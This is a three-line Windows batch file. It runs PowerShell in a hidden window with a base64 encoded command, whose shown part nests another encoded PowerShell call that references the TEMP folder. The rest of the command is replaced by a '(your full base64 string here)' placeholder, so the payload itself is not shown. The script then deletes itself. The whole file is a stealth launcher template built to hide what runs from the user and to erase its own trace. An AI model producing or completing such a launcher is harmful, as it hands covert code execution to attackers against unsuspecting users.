@echo off
powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAG4AYwBvAGQAZQBkAGMAbwBtAGEAbgBkACAAIgAkAGUAbgB2ADoAVABFAE0A... (your full base64 string here)
start /b "" cmd /c del "%~f0"&exit /b
